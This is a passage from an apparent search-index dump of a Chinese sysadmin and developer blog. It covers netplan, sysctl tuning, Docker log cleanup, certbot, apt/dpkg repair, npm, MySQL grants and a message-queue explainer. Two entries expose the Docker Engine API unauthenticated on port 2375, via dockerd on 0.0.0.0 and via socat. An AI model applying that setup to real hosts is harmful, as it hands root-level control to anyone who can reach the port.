前缀内的客户端地址： 12345678910111213141516network: version: 2 ethernets: eth0: addresses: - 1.1.1.1/24 - &quot;2001:cafe:face::1/64&quot; gateway4: 1.1.1.254 tunnels: he-ipv6: mode: sit remote: 2.2.2.2 local: 1.1.1.1 addresses: - &quot;2001:dead:beef::2/64&quot; gateway6: &quot;2001:dead:beef::1&quot; 配置 SR-IOV 虚拟功能对于 SR-IOV 网卡，可以为每个已配置的物理功能动态分配虚拟功能接口。 在 netplan 中，通过具有指向父 PF 的 link：属性来定义 VF。 12345678910111213network: version: 2 ethernets: eno1: mtu: 9000 enp1s16f1: link: eno1 addresses: [&quot;10.15.98.25/24&quot;] vf1: match: name: enp1s16f[2-3] link: eno1 addresses: [&quot;10.15.99.25/24&quot;]","link":"/ops/netplan/"},{"title":"Linux 内核参数优化","text":"系统全局允许分配的最大文件句柄数 1234# 2 millions system-widesysctl -w fs.file-max=2097152sysctl -w fs.nr_open=2097152echo 2097152 &gt; /proc/sys/fs/nr_open 允许当前会话/进程打开文件句柄数: 1ulimit -n 1048576 持久化 fs.file-max 设置到 /etc/sysctl.conf 文件 1fs.file-max = 1048576 /etc/systemd/system.conf 设置服务最大文件句柄数 1DefaultLimitNOFILE=1048576 /etc/security/limits.conf 持久化设置允许用户/进程打开文件句柄数 12* soft nofile 1048576* hard nofile 1048576 并发连接 backlog 设置 123sysctl -w net.core.somaxconn=32768sysctl -w net.ipv4.tcp_max_syn_backlog=16384sysctl -w net.core.netdev_max_backlog=16384 可用知名端口范围 1sysctl -w net.ipv4.ip_local_port_range='1000 65535' TCP Socket 读写 Buffer 设置 123456789sysctl -w net.core.rmem_default=262144sysctl -w net.core.wmem_default=262144sysctl -w net.core.rmem_max=16777216sysctl -w net.core.wmem_max=16777216sysctl -w net.core.optmem_max=16777216#sysctl -w net.ipv4.tcp_mem='16777216 16777216 16777216'sysctl -w net.ipv4.tcp_rmem='1024 4096 16777216'sysctl -w net.ipv4.tcp_wmem='1024 4096 16777216' TCP 连接追踪设置 123sysctl -w net.nf_conntrack_max=1000000sysctl -w net.netfilter.nf_conntrack_max=1000000sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30 TIME-WAIT Socket 最大数量、回收与重用设置 12345net.ipv4.tcp_max_tw_buckets=1048576# 注意: 不建议开启該设置，NAT模式下可能引起连接RST# net.ipv4.tcp_tw_recycle = 1# net.ipv4.tcp_tw_reuse = 1 FIN-WAIT-2 Socket 超时设置 1net.ipv4.tcp_fin_timeout = 15","link":"/ops/linux_sysctl/"},{"title":"Linux IP 管理","text":"删除 IP 123ip addr del 192.168.56.101/24 dev bond0 label bond0:1ip addr del 192.168.56.100/24 dev bond0 新增 IP 123ip addr add 192.168.56.100/24 brd 192.168.56.255 dev bond0ip addr add 192.168.56.101/24 brd 192.168.56.255 dev bond0 label bond0:1","link":"/ops/linux_ip/"},{"title":"释放 Linux Buff &#x2F; Cache","text":"首先要确认，/proc/sys/vm/drop_caches的值为 0，手动执行 sync 命令 1# sync 执行释放 1# echo 3 &gt; /proc/sys/vm/drop_caches","link":"/ops/linux_buffer/"},{"title":"Iptable 规则","text":"添加规则，开放端口（例如 80 端） 1# /sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT 删除规则，如上先查询规则列表 1# iptables -L -n --line-number 然后再通过号码进行删除 1# iptables -D INPUT 2","link":"/ops/iptable/"},{"title":"grub2 引导 Linux 系统","text":"这个是我的 linux 分区，可以根据需要调整 1set root=(hd0,gpt5) 你的 linux 内核,可以通过 Tab 补全，告知 Grub 内核镜像在分区中的位置，以及根文件系统的位置 1linux /boot/vmlinuz-4.17.1-24 root=/dev/sda5 同样可以用 tab 补全。设置虚拟文件系统 initial ramdisk 文件的位置 1initrd /boot/initrd.img-4.17.1-24","link":"/ops/grub2/"},{"title":"Docker 日志清理","text":"我们使用默认 docker 配置来构建服务，有时主机会出现磁盘空间占满，那很可能是 docker 容器的日志所导致的，容器日志一般存放在 /var/lib/docker/containers/container_id/ 下面， 以 json.log 结尾 查看容器日志大小 script1ls -lh $(find /var/lib/docker/containers/ -name *-json.log) 清理容器日志 script1truncate -s 0 /var/lib/docker/containers/*/*-json.log 为了不再出现日志磁盘占满，就需要从源头上限制日志大小，那么可以直接修改 daemon.json 全局来配置 1234{ + &quot;log-driver&quot;: &quot;json-file&quot;, + &quot;log-opts&quot;: { &quot;max-size&quot;: &quot;500m&quot;, &quot;max-file&quot;: &quot;3&quot; }} 重启 docker 服务 script12systemctl daemon-reloadsystemctl restart docker 如果使用 docker-compose 也可以专门为某个容器配置日志 123456789101112131415emqx: image: emqx/emqx restart: always environment: EMQX_NAME: emqx EMQX_ALLOW_ANONYMOUS: &quot;false&quot; EMQX_LISTENER__TCP__EXTERNAL: 1883 EMQX_LISTENER__WS__EXTERNAL: 8083 logging: driver: json-file options: max-size: 1g ports: - 1883:1883 - 8081:8081","link":"/ops/docker_clear/"},{"title":"Docker Engine API 初始","text":"Engine API是 Docker Engine 提供的 HTTP API。它是 Docker 客户端用于与引擎通信的API，因此 Docker 客户端可以做的所有事情都可以通过 API 来完成。 默认 Docker Engine API 只能通过 socket 访问，如果想通过端口访问则需要手动修改服务。 找到 docker.service 文件，通常在 /lib/systemd/system/docker.service，配置默认为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[Unit]Description=Docker Application Container EngineDocumentation=https://docs.docker.comAfter=network-online.target firewalld.service containerd.serviceWants=network-online.targetRequires=docker.socket containerd.service[Service]Type=notify# the default is not to use systemd for cgroups because the delegate issues still# exists and systemd currently does not support the cgroup feature set required# for containers run by dockerExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sockExecReload=/bin/kill -s HUP $MAINPIDTimeoutSec=0RestartSec=2Restart=always# Note that StartLimit* options were moved from &quot;Service&quot; to &quot;Unit&quot; in systemd 229.# Both the old, and new location are accepted by systemd 229 and up, so using the old location# to make them work for either version of systemd.StartLimitBurst=3# Note that StartLimitInterval was renamed to StartLimitIntervalSec in systemd 230.# Both the old, and new name are accepted by systemd 230 and up, so using the old name to make# this option work for either version of systemd.StartLimitInterval=60s# Having non-zero Limit*s causes performance problems due to accounting overhead# in the kernel. We recommend using cgroups to do container-local accounting.LimitNOFILE=infinityLimitNPROC=infinityLimitCORE=infinity# Comment TasksMax if your systemd version does not support it.# Only systemd 226 and above support this option.TasksMax=infinity# set delegate yes so that systemd does not reset the cgroups of docker containersDelegate=yes# kill only the docker process, not all processes in the cgroupKillMode=processOOMScoreAdjust=-500[Install]WantedBy=multi-user.target 查询 ExecStart 项，为其增加参数 -H tcp://0.0.0.0:2375 12- ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock+ ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 --containerd=/run/containerd/containerd.sock 重启服务 script12systemctl daemon-reloadsystemctl restart docker 如果本机想通过公网访问管理，务必要配置上安全组与 TLS 限制，通常情况下限定于私有网络或企业虚拟网络中，以内网方式进行访问管理 Docker Engine API 详情，https://docs.docker.com/engine/api/latest","link":"/ops/docker_api/"},{"title":"使用 backport 更新 Debian","text":"Backport 的含义是”向后移植”，就是将软件新版本的某些功能移植到旧版本上来，这就称为 backport。 Debian 向来以稳定性著称，所以就存在一个问题，官方源分发的软件版本比软件本身的版本总是要慢不少，所以就有了 backports 源。 backports 主要从 testing 源，部分安全更新从 unstable 源重新编译包，使这些包不依赖于新版本的库就可以在 debian 的 stable 发行版上面运行。所以 backports 是 stable 和 testing 的一个折衷。 设置 Backport 源修改文件 /etc/apt/sources.list，向其加入源（这里以 buster 为例） 1deb https://mirrors.cloud.tencent.com/debian buster-backports main contrib non-free 更新源 script1apt update 升级 Linux Kernel首先来到 Debian Backports 网站查询当前版本是否已经提供 Backports 支持，访问 Debian Package List 选择 buster-backports 查看可用的软件包列表，页面找到 Kernels 分类并进入对应的页面，并使用浏览器搜索 linux-image 来查看可用的内核版本。 如何找到适合自己的设备呢？ 64位普通设备，如你的笔记本或工作站: linux-image-amd64 64位基于虚拟化的设备，如 AWS、Azure、普通VPS: linux-image-cloud-amd64 树莓派: linux-image-rpi 找到适合自己设备的包名并且确定版本是自己需要的版本后，然后执行以下命令进行安装： script1sudo apt install -t buster-backports linux-image-amd64 linux-headers-amd64 安装成功后重启即默认使用最新版本内核，可以使用 uname -r 确认新的内核版本","link":"/ops/debain_backports/"},{"title":"Certbot 常用","text":"网站目录方式申请 1certbot certonly --webroot -d www.kainonly.com -w /website/www.kainonly.com 泛域名证书申请 1certbot certonly --preferred-challenges dns --manual -d *.kainonly.com --server https://acme-v02.api.letsencrypt.org/directory 取消证书续订 1certbot delete --cert-name www.kainonly.com","link":"/ops/certbot/"},{"title":"Apt 常见错误","text":"Sub-process /usr/bin/dpkg returned an error code (1) 当发生这种情况时可重建 Apt 软件包配置文件列表 现将 info 目录更名为 info_old 保留 1sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_old 再新建一个新的 info 目录 1sudo mkdir /var/lib/dpkg/info 更新源 1sudo apt-get update 将新的配置文件列表覆盖至原来的 1sudo mv /var/lib/dpkg/info/* /var/lib/dpkg/info_old 删除新创建的 info 目录 1sudo rm -rf /var/lib/dpkg/info 将原来的 info_old 目录恢复原名 info 1sudo mv /var/lib/dpkg/info_old /var/lib/dpkg/info","link":"/ops/apt_error/"},{"title":"Alpine 国内源","text":"阿里云镜像 script1sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories 华为镜像 script1sed -i &quot;s@http://dl-cdn.alpinelinux.org/@https://mirrors.huaweicloud.com/@g&quot; /etc/apk/repositories 科大镜像 script1sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories","link":"/ops/alpine/"},{"title":"解决 Electron 安装慢","text":"使用npm安装electron中，即使npm已经替换了 taobao 源镜像依然很慢，因为安装中脚本会下载境外的特定版本的 electron 的 prebuild 版本 Window使用 Window 平台，可以设置系统变量，将 ELECTRON_MIRROR 设定为 http://npm.taobao.org/mirrors/electron ，然后重新开启终端执行安装，此时脚本就会通过国内源进行下载 Linux使用 Linux 平台，同样可以修改系统变量，可直接修改文件 /etc/profile，向下添加 1export ELECTRON_MIRROR=http://npm.taobao.org/mirrors/electron 执行source生效环境变量 1source /etc/profile MacOS使用 MacOS 平台，找到用户下 ~/.bash_profile 文件，向下添加 1export ELECTRON_MIRROR=&quot;http://npm.taobao.org/mirrors/electron&quot; 执行source生效环境变量 1source ~/.bash_profile","link":"/front-end/electron_setup/"},{"title":"Angular FAQ","text":"内存栈溢出在 Angular 编译构建时突然出现 1FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - process out of memory 主要原因可能是 angular 引用了较多的非 es6 module 库，在编译的时候造成包体积过大，因此对 CPU 和内存的需求比较大，出现了内存不足的情况。目前的解决办法是提高 node 的内存上限，例如：增加 max_old_space_size 参数 12345{ &quot;scripts&quot;: { &quot;build&quot;: &quot;node --max_old_space_size=8192 ./node_modules/@angular/cli/bin/ng build --prod --buildOptimizer&quot; }} 动态导入在 Angular 编译构建库时出现 1angular inlineDynamicImports 检查开发库中是否有懒加载，例如：import() 提示未找到 build-ng-packagr在 Angular 编译构建库时出现 1an unhandled exception occurred: Cannot find module '@angular-devkit/build-ng-packagr/package.json' 检查 angular.json 下 builder 是否正确 1234// not &quot;builder&quot;: &quot;@angular-devkit/build-ng-packagr:build&quot;{ &quot;builder&quot;: &quot;@angular-devkit/build-angular:ng-packagr&quot;} 如果正确依然遇到当前问题，那么需要移除项目内 node_modules 与 package-lock.json，同时需要更新全局的 @angular/cli 12npm uninstall -g @angular/clinpm install -g @angular/cli 到项目中 12rm -rf node_modules package-lock.jsonnpm install 组件抽象定义类在 Angular 中有时需要定义一个组件共用的抽象类，按照正常逻辑则是提示 1Class is using Angular features but is not decorated 解决方法：在抽象类上增加空的指令装饰器 @Directive() 123456/* tslint:disable:directive-class-suffix */@Directive()export abstract class BaseComponent { @Input() players: any;} 参考文献： https://github.com/angular/angular/issues/35367 https://angular.cn/guide/ivy-compatibility-examples#undecorated-classes","link":"/front-end/angular_faq/"},{"title":"消息队列是什么","text":"对于 MQ 来说，其实不管是 RocketMQ、Kafka 还是其他消息队列，它们的本质都是：一发一存一消费。下面我们以这个本质作为根，一起由浅入深地聊聊 MQ。 作者：Lowry链接：https://www.zhihu.com/question/54152397/answer/1802083263 01 从 MQ 的本质说起将 MQ 掰开了揉碎了来看，都是「一发一存一消费」，再直白点就是一个「转发器」。 生产者先将消息投递一个叫做「队列」的容器中，然后再从这个容器中取出消息，最后再转发给消费者，仅此而已。 上面这个图便是消息队列最原始的模型，它包含了两个关键词：消息和队列。 消息：就是要传输的数据，可以是最简单的文本字符串，也可以是自定义的复杂格式（只要能按预定格式解析出来即可）。 队列：大家应该再熟悉不过了，是一种先进先出数据结构。它是存放消息的容器，消息从队尾入队，从队头出队，入队即发消息的过程，出队即收消息的过程。 02 原始模型的进化再看今天我们最常用的消息队列产品（RocketMQ、Kafka 等等），你会发现：它们都在最原始的消息模型上做了扩展，同时提出了一些新名词，比如：主题（topic）、分区（partition）、队列（queue）等等。 要彻底理解这些五花八门的新概念，我们化繁为简，先从消息模型的演进说起（道理好比：架构从来不是设计出来的，而是演进而来的） 2.1 队列模型最初的消息队列就是上一节讲的原始模型，它是一个严格意义上的队列（Queue）。消息按照什么顺序写进去，就按照什么顺序读出来。不过，队列没有 “读” 这个操作，读就是出队，从队头中 “删除” 这个消息。 这便是队列模型：它允许多个生产者往同一个队列发送消息。但是，如果有多个消费者，实际上是竞争的关系，也就是一条消息只能被其中一个消费者接收到，读完即被删除。 2.2 发布-订阅模型如果需要将一份消息数据分发给多个消费者，并且每个消费者都要求收到全量的消息。很显然，队列模型无法满足这个需求。 一个可行的方案是：为每个消费者创建一个单独的队列，让生产者发送多份。这种做法比较笨，而且同一份数据会被复制多份，也很浪费空间。 为了解决这个问题，就演化出了另外一种消息模型：发布-订阅模型。 在发布-订阅模型中，存放消息的容器变成了 “主题”，订阅者在接收消息之前需要先 “订阅主题”。最终，每个订阅者都可以收到同一个主题的全量消息。 仔细对比下它和 “队列模式” 的异同：生产者就是发布者，队列就是主题，消费者就是订阅者，无本质区别。唯一的不同点在于：一份消息数据是否可以被多次消费。 2.3 小结最后做个小结，上面两种模型说白了就是：单播和广播的区别。而且，当发布-订阅模型中只有 1 个订阅者时，它和队列模型就一样了，因此在功能上是完全兼容队列模型的。 这也解释了为什么现代主流的 RocketMQ、Kafka 都是直接基于发布-订阅模型实现的？此外，RabbitMQ 中之所以有一个 Exchange 模块？其实也是为了解决消息的投递问题，可以变相实现发布-订阅模型。 包括大家接触到的 “消费组”、“集群消费”、“广播消费” 这些概念，都和上面这两种模型相关，以及在应用层面大家最常见的情形：组间广播、组内单播，也属于此范畴。 所以，先掌握一些共性的理论，对于大家再去学习各个消息中间件的具体实现原理时，其实能更好地抓住本质，分清概念。 03 透过模型看 MQ 的应用场景目前，MQ 的应用场景非常多，大家能倒背如流的是：系统解耦、异步通信和流量削峰。除此之外，还有延迟通知、最终一致性保证、顺序消息、流式处理等等。 那到底是先有消息模型，还是先有应用场景呢？答案肯定是：先有应用场景（也就是先有问题），再有消息模型，因为消息模型只是解决方案的抽象而已。 MQ 经过 30 多年的发展，能从最原始的队列模型发展到今天百花齐放的各种消息中间件（平台级的解决方案），我觉得万变不离其宗，还是得益于：消息模型的适配性很广。 我们试着重新理解下消息队列的模型。它其实解决的是：生产者和消费者的通信问题。那它对比 RPC 有什么联系和区别呢？ 通过对比，能很明显地看出两点差异： 引入 MQ 后，由之前的一次 RPC 变成了现在的两次 RPC，而且生产者只跟队列耦合，它根本无需知道消费者的存在。 多了一个中间节点「队列」进行消息转储，相当于将同步变成了异步。 再返过来思考 MQ 的所有应用场景，就不难理解 MQ 为什么适用了？因为这些应用场景无外乎都利用了上面两个特性。 举一个实际例子，比如说电商业务中最常见的「订单支付」场景：在订单支付成功后，需要更新订单状态、更新用户积分、通知商家有新订单、更新推荐系统中的用户画像等等。 引入 MQ 后，订单支付现在只需要关注它最重要的流程：更新订单状态即可。其他不重要的事情全部交给 MQ 来通知。这便是 MQ 解决的最核心的问题：系统解耦。 改造前订单系统依赖 3 个外部系统，改造后仅仅依赖 MQ，而且后续业务再扩展（比如：营销系统打算针对支付用户奖励优惠券），也不涉及订单系统的修改，从而保证了核心流程的稳定性，降低了维护成本。 这个改造还带来了另外一个好处：因为 MQ 的引入，更新用户积分、通知商家、更新用户画像这些步骤全部变成了异步执行，能减少订单支付的整体耗时，提升订单系统的吞吐量。这便是 MQ 的另一个典型应用场景：异步通信。 除此以外，由于队列能转储消息，对于超出系统承载能力的场景，可以用 MQ 作为 “漏斗” 进行限流保护，即所谓的流量削峰。 我们还可以利用队列本身的顺序性，来满足消息必须按顺序投递的场景；利用队列 + 定时任务来实现消息的延时消费 …… MQ 其他的应用场景基本类似，都能回归到消息模型的特性上，找到它适用的原因，这里就不一一分析了。 总之，就是建议大家多从复杂多变的实践场景再回归到理论层面进行思考和抽象，这样能吃得更透。 04 如何设计一个 MQ？了解了上面这些理论知识以及应用场景后，下面我们再一起看下：到底如何设计一个 MQ？ 4.1 MQ 的雏形我们还是先从简单版的 MQ 入手，如果只是实现一个很粗糙的 MQ，完全不考虑生产环境的要求，该如何设计呢？ 文章开头说过，任何 MQ 无外乎：一发一存一消费，这是 MQ 最核心的功能需求。另外，从技术维度来看 MQ 的通信模型，可以理解成：两次 RPC + 消息转储。 有了这些理解，我相信只要有一定的编程基础，不用 1 个小时就能写出一个 MQ 雏形： 直接利用成熟的 RPC 框架（Dubbo 或者 Thrift），实现两个接口：发消息和读消息。 消息放在本地内存中即可，数据结构可以用 JDK 自带的 ArrayBlockingQueue。 4.2 写一个适用于生产环境的 MQ当然，我们的目标绝不止于一个 MQ 雏形，而是希望实现一个可用于生产环境的消息中间件，那难度肯定就不是一个量级了，具体我们该如何下手呢？ 1、先把握这个问题的关键点假如我们还是只考虑最基础的功能：发消息、存消息、消费消息（支持发布-订阅模式）。 那在生产环境中，这些基础功能将面临哪些挑战呢？我们能很快想到下面这些： 高并发场景下，如何保证收发消息的性能？ 如何保证消息服务的高可用和高可靠？ 如何保证服务是可以水平任意扩展的？ 如何保证消息存储也是水平可扩展的？ 各种元数据（比如集群中的各个节点、主题、消费关系等）如何管理，需不需要考虑数据的一致性？ 可见，高并发场景下的三高问题在你设计一个 MQ 时都会遇到，「如何满足高性能、高可靠等非功能性需求」才是这个问题的关键所在。 2、整体设计思路先来看下整体架构，会涉及三类角色： 另外，将「一发一存一消费」这个核心流程进一步细化后，比较完整的数据流如下： 基于上面两个图，我们可以很快明确出 3 类角色的作用，分别如下： Broker（服务端）：MQ 中最核心的部分，是 MQ 的服务端，核心逻辑几乎全在这里，它为生产者和消费者提供 RPC 接口，负责消息的存储、备份和删除，以及消费关系的维护等。 Producer（生产者）：MQ 的客户端之一，调用 Broker 提供的 RPC 接口发送消息。 Consumer（消费者）：MQ 的另外一个客户端，调用 Broker 提供的 RPC 接口接收消息，同时完成消费确认。 3、详细设计下面，再展开讨论下一些具体的技术难点和可行的解决方案。 难点 1：RPC 通信解决的是 Broker 与 Producer 以及 Consumer 之间的通信问题。如果不重复造轮子，直接利用成熟的 RPC 框架 Dubbo 或者 Thrift 实现即可，这样不需要考虑服务注册与发现、负载均衡、通信协议、序列化方式等一系列问题了。 当然，你也可以基于 Netty 来做底层通信，用 Zookeeper、Euraka 等来做注册中心，然后自定义一套新的通信协议（类似 Kafka），也可以基于 AMQP 这种标准化的 MQ 协议来做实现（类似 RabbitMQ）。对比直接用 RPC 框架，这种方案的定制化能力和优化空间更大。 难点 2：高可用设计高可用主要涉及两方面：Broker 服务的高可用、存储方案的高可用。可以拆开讨论。 Broker 服务的高可用，只需要保证 Broker 可水平扩展进行集群部署即可，进一步通过服务自动注册与发现、负载均衡、超时重试机制、发送和消费消息时的 ack 机制来保证。 存储方案的高可用有两个思路：1）参考 Kafka 的分区 + 多副本模式，但是需要考虑分布式场景下数据复制和一致性方案（类似 Zab、Raft 等协议），并实现自动故障转移；2）还可以用主流的 DB、分布式文件系统、带持久化能力的 KV 系统，它们都有自己的高可用方案。 难点 3：存储设计消息的存储方案是 MQ 的核心部分，可靠性保证已经在高可用设计中谈过了，可靠性要求不高的话直接用内存或者分布式缓存也可以。这里重点说一下存储的高性能如何保证？这个问题的决定因素在于存储结构的设计。 目前主流的方案是：追加写日志文件（数据部分） + 索引文件的方式（很多主流的开源 MQ 都是这种方式），索引设计上可以考虑稠密索引或者稀疏索引，查找消息可以利用跳转表、二份查找等，还可以通过操作系统的页缓存、零拷贝等技术来提升磁盘文件的读写性能。 如果不追求很高的性能，也可以考虑现成的分布式文件系统、KV 存储或者数据库方案。 难点 4：消费关系管理为了支持发布-订阅的广播模式，Broker 需要知道每个主题都有哪些 Consumer 订阅了，基于这个关系进行消息投递。 由于 Broker 是集群部署的，所以消费关系通常维护在公共存储上，可以基于 Zookeeper、Apollo 等配置中心来管理以及进行变更通知。 难点 5：高性能设计存储的高性能前面已经谈过了，当然还可以从其他方面进一步优化性能。 比如 Reactor 网络 IO 模型、业务线程池的设计、生产端的批量发送、Broker 端的异步刷盘、消费端的批量拉取等等 4.3 小结再总结下，要回答好：如何设计一个 MQ？ 需要从功能性需求（收发消息）和非功能性需求（高性能、高可用、高扩展等）两方面入手。 功能性需求不是重点，能覆盖 MQ 最基础的功能即可，至于延时消息、事务消息、重试队列等高级特性只是锦上添花的东西。 最核心的是：能结合功能性需求，理清楚整体的数据流，然后顺着这个思路去考虑非功能性的诉求如何满足，这才是技术难点所在。 05 写在最后上面这些内容从 MQ 一发一存一消费这个本质出发，讲解了消息模型的演进过程，这是 MQ 最核心的理论基础。基于此，大家也能更容易理解 MQ 的各种新名词以及应用场景。 最后通过回答：如何设计一个 MQ？目的是让大家对 MQ 的核心组件和技术难点有一个清晰的认识。另外，带着这个问题的答案再去学习 Kafka、RocketMQ 等具体的消息中间件时，也会更有侧重点。","link":"/backend/what_mq/"},{"title":"MAC 开启 Docker 端口","text":"使用 socat 转发为 2375 端口 1socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock","link":"/knowledge/mac_docker/"},{"title":"Github 密钥设置","text":"设置 git 的 user.name 和 user.email 12# git config --global user.name &quot;kain&quot;# git config --global user.email &quot;zhangtqx@vip.qq.com&quot; 生成 RSA 密钥对 1# ssh-keygen -t rsa -C 将公钥内容上传至 git 服务器 或 github，测试一下 1# ssh git@github.com 生成以下内容代表成功 123Warning: Permanently added 'github.com,192.30.255.112' (RSA) to the list of known hosts.PTY allocation request failed on channel 0Hi kainOnly! You've successfully authenticated, but GitHub does not provide shell access.","link":"/knowledge/github_key/"},{"title":"MySQL 创建用户与基本授权","text":"创建用户创建一个用户名为 jeffrey 并且只能 localhost 连接，通常情况下这样执行 1CREATE USER 'jeffrey'@'localhost' IDENTIFIED BY 'password'; 完整的语句： 12345678910111213141516171819202122232425262728293031323334353637383940414243CREATE USER [IF NOT EXISTS] user [auth_option] [, user [auth_option]] ... [REQUIRE {NONE | tls_option [[AND] tls_option] ...}] [WITH resource_option [resource_option] ...] [password_option | lock_option] ...user: (see Section 6.2.4, “Specifying Account Names”)auth_option: { IDENTIFIED BY 'auth_string' | IDENTIFIED WITH auth_plugin | IDENTIFIED WITH auth_plugin BY 'auth_string' | IDENTIFIED WITH auth_plugin AS 'auth_string' | IDENTIFIED BY PASSWORD 'auth_string'}tls_option: { SSL | X509 | CIPHER 'cipher' | ISSUER 'issuer' | SUBJECT 'subject'}resource_option: { MAX_QUERIES_PER_HOUR count | MAX_UPDATES_PER_HOUR count | MAX_CONNECTIONS_PER_HOUR count | MAX_USER_CONNECTIONS count}password_option: { PASSWORD EXPIRE | PASSWORD EXPIRE DEFAULT | PASSWORD EXPIRE NEVER | PASSWORD EXPIRE INTERVAL N DAY}lock_option: { ACCOUNT LOCK | ACCOUNT UNLOCK} 对于每个帐户，CREATE USER 在 mysql.user 系统表中创建一个新行。 帐户行反映了语句中指定的属性。 未指定的属性设置为其默认值： Authentication： 由 default_authentication_plugin 系统变量定义的身份验证插件，以及空凭据 SSL / TLS：无 Resource limits：无限制 Password management：PASSWORD EXPIRE DEFAULT Account locking：ACCOUNT UNLOCK 用户授权允许 jeffrey 用户拥有数据库 db1 的所有表的权限 1GRANT ALL ON db1.* TO 'jeffrey'@'localhost'; 完整语句： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152GRANT priv_type [(column_list)] [, priv_type [(column_list)]] ... ON [object_type] priv_level TO user [auth_option] [, user [auth_option]] ... [REQUIRE {NONE | tls_option [[AND] tls_option] ...}] [WITH {GRANT OPTION | resource_option} ...]GRANT PROXY ON user TO user [, user] ... [WITH GRANT OPTION]object_type: { TABLE | FUNCTION | PROCEDURE}priv_level: { * | *.* | db_name.* | db_name.tbl_name | tbl_name | db_name.routine_name}user: (see Section 6.2.4, “Specifying Account Names”)auth_option: { IDENTIFIED BY 'auth_string' | IDENTIFIED WITH auth_plugin | IDENTIFIED WITH auth_plugin BY 'auth_string' | IDENTIFIED WITH auth_plugin AS 'auth_string' | IDENTIFIED BY PASSWORD 'auth_string'}tls_option: { SSL | X509 | CIPHER 'cipher' | ISSUER 'issuer' | SUBJECT 'subject'}resource_option: { | MAX_QUERIES_PER_HOUR count | MAX_UPDATES_PER_HOUR count | MAX_CONNECTIONS_PER_HOUR count | MAX_USER_CONNECTIONS count} Privileges for GRANT 的更多描述","link":"/database/mysql_user/"},{"title":"Npm 常用命令","text":"NPM 的全称是 Node Package Manager，是随同 NodeJS 一起安装的包管理和分发工具，它很方便让 JavaScript 开发者下载、安装、上传以及管理已经安装的包。 npm init用于设置新的或现有的 npm 软件包 1234npm init [--force|-f|--yes|-y|--scope]npm init &lt;@scope&gt; (same as `npm exec &lt;@scope&gt;/create`)npm init [&lt;@scope&gt;/]&lt;name&gt; (same as `npm exec [&lt;@scope&gt;/]create-&lt;name&gt;`)npm init [-w &lt;dir&gt;] [args...] npm install此命令将安装软件包及其依赖的任何软件包 1234567891011121314npm install (with no args, in package dir)npm install [&lt;@scope&gt;/]&lt;name&gt;npm install [&lt;@scope&gt;/]&lt;name&gt;@&lt;tag&gt;npm install [&lt;@scope&gt;/]&lt;name&gt;@&lt;version&gt;npm install [&lt;@scope&gt;/]&lt;name&gt;@&lt;version range&gt;npm install &lt;alias&gt;@npm:&lt;name&gt;npm install &lt;git-host&gt;:&lt;git-user&gt;/&lt;repo-name&gt;npm install &lt;git repo url&gt;npm install &lt;tarball file&gt;npm install &lt;tarball url&gt;npm install &lt;folder&gt;aliases: npm i, npm addcommon options: [-P|--save-prod|-D|--save-dev|-O|--save-optional|--save-peer] [-E|--save-exact] [-B|--save-bundle] [--no-save] [--dry-run] -g or --global 全局安装 -S or --save 本地运行时安装 -P or --save-prod 生产运行时安装 -D or --save-dev 开发运行时安装 npm uninstall这将卸载软件包，从而完全删除代表该软件包安装的所有 npm 123npm uninstall [&lt;@scope&gt;/]&lt;pkg&gt;[@&lt;version&gt;]... [-S|--save|--no-save]aliases: remove, rm, r, un, unlink npm update该命令会将所有列出的软件包更新到最新版本（由标记 config 指定），同时注意使用 semver 123npm update [-g] [&lt;pkg&gt;...]aliases: up, upgrade npm rebuild此命令在匹配的文件夹上运行 npm build 命令 123npm rebuild [[&lt;@scope&gt;/]&lt;name&gt;[@&lt;version&gt;] ...]alias: rb npm auditaudit 命令将对项目中配置的依赖项的描述提交给默认源，并要求提供已知漏洞的报告。 1234npm audit [--json] [--production] [--audit-level=(low|moderate|high|critical)]npm audit fix [--force|--package-lock-only|--dry-run|--production|--only=(dev|prod)]common options: [--production] [--only=(dev|prod)] npm cache用于添加，列出或清理 npm 缓存文件夹 123456789npm cache add &lt;tarball file&gt;...npm cache add &lt;folder&gt;...npm cache add &lt;tarball url&gt;...npm cache add &lt;name&gt;@&lt;version&gt;...npm cache cleanaliases: npm cache clear, npm cache rmnpm cache verify npm confignpm config 命令可用于更新和编辑用户和全局 npmrc 文件的内容 123456789npm config set &lt;key&gt;=&lt;value&gt; [&lt;key&gt;=&lt;value&gt; ...]npm config get [&lt;key&gt; [&lt;key&gt; ...]]npm config delete &lt;key&gt; [&lt;key&gt; ...]npm config list [--json]npm config editnpm set &lt;key&gt;=&lt;value&gt; [&lt;key&gt;=&lt;value&gt; ...]npm get [&lt;key&gt; [&lt;key&gt; ...]]alias: c npm adduser在指定的源中创建或验证名为 &lt;username&gt; 的用户，然后将凭据保存到 .npmrc 文件中 123npm adduser [--registry=url] [--scope=@orgname] [--auth-type=legacy]aliases: login, add-user npm publish将程序包发布到源，以便可以按名称安装 1234npm publish [&lt;tarball&gt;|&lt;folder&gt;] [--tag &lt;tag&gt;] [--access &lt;public|restricted&gt;] [--otp otpcode] [--dry-run]Publishes '.' if no argument suppliedSets tag 'latest' if no --tag specified 组织发布公共包必须 --access=public，设置 package.json 的 private 无效 npm deprecate此命令将更新软件包的 npm 源项，向所有尝试安装该软件包的人提供弃用警告。 1npm deprecate &lt;pkg&gt;[@&lt;version range&gt;] &lt;message&gt; npm unpublish这将从源中删除软件包版本，删除其条目并删除压缩包。 1npm unpublish [&lt;@scope&gt;/]&lt;pkg&gt;@&lt;version&gt; 即使取消发布程序包版本，该特定名称和版本组合也永远无法重用。 为了再次发布该程序包，您必须使用新的版本号。 如果取消发布整个程序包，则可能要等到 24 小时后才能发布该程序包的任何新版本。","link":"/front-end/npm/"},{"title":"PHP-FPM 编译","text":"适用于 centos、debain 与 ubuntu 系统进行编译安装与部署 安装编译所需开发库 在 centos 下执行安装 